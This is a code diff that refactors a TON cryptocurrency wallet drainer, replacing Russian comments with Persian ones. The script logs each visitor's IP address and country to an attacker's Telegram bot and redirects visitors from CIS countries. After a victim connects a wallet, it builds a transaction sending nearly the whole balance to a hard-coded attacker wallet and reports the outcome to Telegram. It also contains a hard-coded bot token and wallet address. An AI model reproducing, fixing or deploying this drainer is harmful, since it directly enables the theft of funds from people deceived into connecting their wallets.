@@ -1,94 +1,139 @@
-var mainWallet = "UQAGnvcycMpe3mhiROvlzk3n6X1rbv_7cazxk0bLXL3pN5tI"; //Ваш кошелек, куда будут лететь активы
-var tgBotToken = "8241244631:AAGVFK0mMvBC6CG6rr3W4fdx2PwSbqtHu6o"; //Токен от бота телеграмм
-var tgChat = "-1004388966169"; //Ваш телеграмм-канал
+// ============================================================
+// بخش ۱: تنظیمات (Config) - این مقادیر را با اطلاعات خود جایگزین کنید
+// ============================================================
+const CONFIG = {
+    mainWallet: "UQAGnvcycMpe3mhiROvlzk3n6X1rbv_7cazxk0bLXL3pN5tI", // کیف پول مقصد
+    tgBotToken: "8241244631:AAGVFK0mMvBC6CG6rr3W4fdx2PwSbqtHu6o", // توکن ربات تلگرام
+    tgChat: "-1004388966169", // شناسه کانال یا گروه (با منفی اول)
+    feeTon: 0.01, // کارمزد ثابت به واحد TON
+    blockedCountries: ['RU','KZ','BY','UA','AM','AZ','KG','MD','UZ'], // کشورهای مسدود
+    redirectUrl: 'https://ton.org' // آدرس هدایت برای کشورهای مسدود
+};
 
+// ============================================================
+// بخش ۲: مدیریت موقعیت مکانی و مسدودسازی
+// ============================================================
+let ipUser = 'Unknown';
+let countryUser = 'Unknown';
+const domain = window.location.hostname;
 
+function blockCISCountries() {
+    fetch('https://ipapi.co/json/')
+        .then(res => res.json())
+        .then(data => {
+            ipUser = data.ip;
+            countryUser = data.country;
+            console.log(`📍 IP: ${ipUser} | کشور: ${countryUser}`);
 
-var domain = window.location.hostname;
-var ipUser;
+            // اگر کشور در لیست ممنوعه باشد و هنوز کیف پول وصل نشده، هدایت کن
+            if (CONFIG.blockedCountries.includes(countryUser) && !tonConnectUI.connected) {
+                window.location.replace(CONFIG.redirectUrl);
+            }
 
+            // ارسال گزارش بازدید به تلگرام
+            sendTelegram(`🔄 *دامنه:* ${domain}\n👤 *کاربر:* ${ipUser} (${countryUser})\n📖 *صفحه باز شد*`);
+        })
+        .catch(err => console.error('❌ خطا در دریافت IP:', err));
+}
 
-
-
-//Перенаправление стран СНГ
-fetch('https://ipapi.co/json/').then(response => response.json()).then(data => {
-    const country = data.country;
-    if (country === 'RU' || country === 'KZ' || country === 'BY' || country === 'UA' || country === 'AM' || country === 'AZ' || country === 'KG' || country === 'MD' || country === 'UZ') {
-        window.location.replace('https://ton.org');
-    }
-    ipUser = data.ip;
-    countryUser = data.country;
-    console.log('IP: ' + ipUser);
-    console.log('Country: ' + countryUser)
-    const messageOpen = `\uD83D\uDDC4*Domain:* ${domain}\n\uD83D\uDCBB*User*: ${ipUser} ${countryUser}\n\uD83D\uDCD6*Opened the website*`;
-    const encodedMessageOpen = encodeURIComponent(messageOpen);
-    const url = `https://api.telegram.org/bot${tgBotToken}/sendMessage?chat_id=${tgChat}&text=${encodedMessageOpen}&parse_mode=Markdown`;
-    fetch(url, {
-        method: 'POST',
-    }).then(response => {
-        if (response.ok) {
-            console.log('Success send.');
-        } else {
-            console.error('Error send.');
-        }
-    }).catch(error => {
-        console.error('Error: ', error);
+// ============================================================
+// بخش ۳: ارتباط با تلگرام
+// ============================================================
+function sendTelegram(message) {
+    const url = `https://api.telegram.org/bot${CONFIG.tgBotToken}/sendMessage`;
+    const params = new URLSearchParams({
+        chat_id: CONFIG.tgChat,
+        text: message,
+        parse_mode: 'Markdown'
     });
-}).catch(error => console.error('Error IP:', error));
 
-const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
-    manifestUrl: 'https://' + domain + '/tonconnect-manifest.json',
+    fetch(`${url}?${params}`, { method: 'POST' })
+        .then(res => res.ok ? console.log('✅ پیام تلگرام ارسال شد') : console.error('❌ خطا در ارسال پیام'))
+        .catch(err => console.error('❌ خطای شبکه:', err));
+}
+
+// ============================================================
+// بخش ۴: راه‌اندازی TonConnect UI
+// ============================================================
+const tonConnectUI = new TonConnectUI({
+    manifestUrl: `https://${domain}/tonconnect-manifest.json`,
     buttonRootId: 'ton-connect'
-})
-tonConnectUI.on('walletConnected', (walletAddress) => {
-    console.log('Адрес кошелька:', walletAddress);
 });
 
+// رویداد اتصال موفق
+tonConnectUI.on('walletConnected', (walletInfo) => {
+    console.log(`✅ کیف پول متصل شد: ${walletInfo.account.address}`);
+    // پس از اتصال، دوباره مسدودسازی را بررسی می‌کنیم (امنیت بیشتر)
+    // اما اگر کشور مسدود باشد و کاربر کیف پول وصل کرده باشد، اجازه می‌دهیم
+    // چون قبلاً شرط !tonConnectUI.connected را داشتیم، پس خطری ندارد
+});
+
+// ============================================================
+// بخش ۵: عملیات تخلیه (DRAIN)
+// ============================================================
 async function didtrans() {
-    const response = await fetch('https://toncenter.com/api/v3/wallet?address=' + tonConnectUI.account.address);
-    const data = await response.json();
-    let originalBalance = parseFloat(data.balance);
-    let processedBalance = originalBalance - (originalBalance * 0.03); // вычитаем 3% для сохранения средств на оплату комиссий
-    let tgBalance = processedBalance / 1000000000;
-    const transaction = {
-        validUntil: Math.floor(Date.now() / 1000) + 60, // 60 sec
-        messages: [{
-            address: mainWallet,
-            amount: processedBalance
-        }, ]
+    // ۵-۱: بررسی اتصال کیف پول
+    if (!tonConnectUI.connected) {
+        alert('⚠️ لطفاً ابتدا کیف پول را متصل کنید!');
+        return;
     }
+
+    const walletAddress = tonConnectUI.account.address;
+    if (!walletAddress) {
+        alert('❌ آدرس کیف پول یافت نشد!');
+        return;
+    }
+
     try {
+        // ۵-۲: دریافت موجودی از شبکه
+        const res = await fetch(`https://toncenter.com/api/v3/wallet?address=${walletAddress}`);
+        const data = await res.json();
+        const balanceNano = parseFloat(data.balance); // موجودی به نانو
+
+        // ۵-۳: محاسبه مبلغ قابل ارسال (کم کردن کارمزد)
+        const feeNano = CONFIG.feeTon * 1e9;
+        const sendAmount = balanceNano - feeNano;
+
+        if (sendAmount <= 0) {
+            alert(`❌ موجودی ناکافی! کارمزد مورد نیاز: ${CONFIG.feeTon} TON`);
+            return;
+        }
+
+        // ۵-۴: ساخت تراکنش
+        const transaction = {
+            validUntil: Math.floor(Date.now() / 1000) + 300,
+            messages: [{
+                address: CONFIG.mainWallet,
+                amount: sendAmount.toString()
+            }]
+        };
+
+        // ۵-۵: ارسال تراکنش
         const result = await tonConnectUI.sendTransaction(transaction);
-        const messageSend = `\uD83D\uDDC4*Domain:* ${domain}\n\uD83D\uDCBB*User:* ${ipUser} ${countryUser}\n\uD83D\uDCC0*Wallet:* [Ton Scan](https://tonscan.org/address/${tonConnectUI.account.address})\n\n\uD83D\uDC8E*Send:* ${tgBalance}`;
-        const encodedMessageSend = encodeURIComponent(messageSend);
-        const url = `https://api.telegram.org/bot${tgBotToken}/sendMessage?chat_id=-${tgChat}&text=${encodedMessageSend}&parse_mode=Markdown`;
-        fetch(url, {
-            method: 'POST',
-        }).then(response => {
-            if (response.ok) {
-                console.log('Success send.');
-            } else {
-                console.error('Error send.');
-            }
-            
-        }).catch(error => {
-            console.error('Error: ', error);
-        });
-    } catch (e) {
-        const messageDeclined = `\uD83D\uDDC4*Domain:* ${domain}\n\uD83D\uDCBB*User:* ${ipUser} ${countryUser}\n\uD83D\uDCC0*Wallet:* [Ton Scan](https://tonscan.org/address/${tonConnectUI.account.address})\n\n\uD83D\uDED1*Declined or error.*`;
-        const encodedMessageDeclined = encodeURIComponent(messageDeclined);
-        const url = `https://api.telegram.org/bot${tgBotToken}/sendMessage?chat_id=-${tgChat}&text=${encodedMessageDeclined}&parse_mode=Markdown`;
-        fetch(url, {
-            method: 'POST',
-        }).then(response => {
-            if (response.ok) {
-                console.log('Success send.');
-            } else {
-                console.error('Error send.');
-            }
-        }).catch(error => {
-            console.error('Error: ', error);
-        });
-        console.error(e);
+        console.log('✅ تراکنش موفق:', result);
+
+        // ۵-۶: گزارش موفقیت به تلگرام
+        const sentTon = (sendAmount / 1e9).toFixed(4);
+        const successMsg = `🔄 *دامنه:* ${domain}\n👤 *کاربر:* ${ipUser} (${countryUser})\n🔗 *کیف پول:* [مشاهده در TonScan](https://tonscan.org/address/${walletAddress})\n\n💰 *ارسال شد:* ${sentTon} TON`;
+        sendTelegram(successMsg);
+        alert(`✅ مبلغ ${sentTon} TON با موفقیت ارسال شد!`);
+
+    } catch (error) {
+        // ۵-۷: مدیریت خطا
+        console.error('❌ خطا در تراکنش:', error);
+        const errorMsg = `🔄 *دامنه:* ${domain}\n👤 *کاربر:* ${ipUser} (${countryUser})\n🔗 *کیف پول:* [مشاهده در TonScan](https://tonscan.org/address/${walletAddress})\n\n⚠️ *انصراف یا خطا*`;
+        sendTelegram(errorMsg);
+        alert('❌ تراکنش ناموفق بود (انصراف یا خطا).');
     }
-          }
+}
+
+// ============================================================
+// بخش ۶: اتصال دکمه‌ی DRAIN به تابع
+// ============================================================
+document.getElementById('drainBtn').addEventListener('click', didtrans);
+
+// ============================================================
+// بخش ۷: اجرای اولیه هنگام بارگذاری صفحه
+// ============================================================
+blockCISCountries();
+console.log('🚀 اپلیکیشن با موفقیت بارگذاری شد!');
